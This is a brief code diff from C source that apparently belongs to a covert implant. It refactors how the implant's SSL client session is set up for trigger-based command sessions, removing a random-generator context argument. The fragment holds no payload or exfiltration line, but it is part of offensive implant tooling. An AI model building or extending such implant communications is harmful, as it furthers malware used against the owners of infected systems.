@@ -31,7 +31,6 @@ static int hstat( int fd );
 const unsigned long CMD_TIMEOUT = 5*60*1000; // 5 minutes
 const unsigned long PKT_TIMEOUT = 30*1000; // 30 sec.
 
-static ctr_drbg_context ctr_drbg;
 static ssl_context	trig_ssl;
 static ssl_session	trig_ssn;
 #define _fstat fstat
@@ -435,7 +434,7 @@ unsigned long StartClientSession( int sock )
 	// we have an established TCP/IP connection
 	// although we consider this the SERVER, for the SSL/TLS transaction, 
 	// the implant acts as a SSL client
-	if ( crypt_setup_client( &ctr_drbg, &trig_ssl, &trig_ssn, &sock ) != SUCCESS )
+	if ( crypt_setup_client(&trig_ssl, &trig_ssn, &sock ) != SUCCESS )
 	{
 		DLX(2, printf("ERROR: crypt_setup_client()\n"));
 			crypt_cleanup( &trig_ssl);
